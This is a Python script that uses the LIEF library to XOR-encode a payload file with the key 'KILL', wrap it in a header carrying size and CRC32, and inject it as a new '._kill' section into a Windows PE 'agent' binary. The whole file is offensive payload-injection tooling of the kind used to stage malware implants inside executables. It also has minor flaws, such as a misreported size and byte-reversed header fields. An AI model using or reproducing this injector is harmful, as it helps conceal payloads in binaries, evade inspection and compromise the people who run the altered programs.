import sys
import binascii
import argparse

import lief


def inject_windows(payload, args):
    print("[+] Parsing target PE file.")
    app: lief.PE = lief.parse(args.agent)
    if app is None:
        print("[!] Cannot find target file.")
        return -1

    print("[+] Adding payload section to target PE file.")
    section = lief.PE.Section("._kill")
    section.content = payload
    app.add_section(section, lief.PE.SECTION_TYPES.DATA)

    try:
        app.write(args.output)
    except Exception as Error:
        print("[!] Error injecting payload into target.")
        return -1

    print("[+] Wrote payload to target binary")


def cli() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='Injector')
    parser.add_argument('--agent', help="Path to the agent.", required=True)
    parser.add_argument('--payload', help="Path to payload", required=True)
    parser.add_argument('--output', help="Path to save payload that has been injected.", required=True)
    return parser.parse_args()


def multibyte_xor(data, key):
    if len(key) == 0 or len(key) > len(data):
        raise ValueError("[!] Key length exception.")

    encrypted_data = bytearray()

    for i in range(len(data)):
        k = key[i % len(key)]
        c = data[i] ^ k
        encrypted_data.append(c)
    return bytes(encrypted_data)


def main() -> int:
    '''
    +===============================+=======================+========================+=====================+
    | Payload Blob Format           |                       |                        |                     |
    +===============================+=======================+========================+=====================+
    | Header (4-bytes)              | Size (4-bytes)        | CRC32 (4-bytes)        | Encrypted Payload   |
    +-------------------------------+-----------------------+------------------------+---------------------+
    | KILL (or whatever)            | <size of raw payload> | <CRC32 of raw payload> | <encrypted payload> |
    +-------------------------------+-----------------------+------------------------+---------------------+
    '''

    # Blob format magic value
    magic = "KILL"

    # Cmd line processing
    cli_args = cli()

    # Open the payload for reading
    with open(cli_args.payload, "rb") as payload_file:
        raw_payload = payload_file.read()

    # Size of raw_payload
    raw_payload_size = len(raw_payload).to_bytes(4, "little")
    # Generate the unsigned 32-bit checksum of raw_payload
    raw_payload_crc = binascii.crc32(raw_payload).to_bytes(4, "little")
    # Encode/Encrypt raw_payload
    payload = list(multibyte_xor(raw_payload, bytes(magic, 'utf-8')))

    print("[+] Size of the raw payload blob in bytes: ", int.from_bytes(raw_payload_size, "little"))
    print("[+] Size of the encoded/encrypted payload blob in bytes: ", payload.__sizeof__())
    print("[+] CRC32 of the raw payload: ", int.from_bytes(raw_payload_crc, "little"))
    print("[+] Building blob...")

    # Add crc to payload blob - for each byte of the crc insert into blob
    for i in raw_payload_crc:
        payload.insert(0, i)
    # Add size to payload blob, get size of raw_payload
    for i in raw_payload_size:
        payload.insert(0, i)
    # Add magic header to payload blob
    for i in range(0, len(magic)):
        payload.insert(i, ord(magic[i]))

    inject_windows(payload, cli_args)

    return 0


if __name__ == '__main__':
    sys.exit(main())
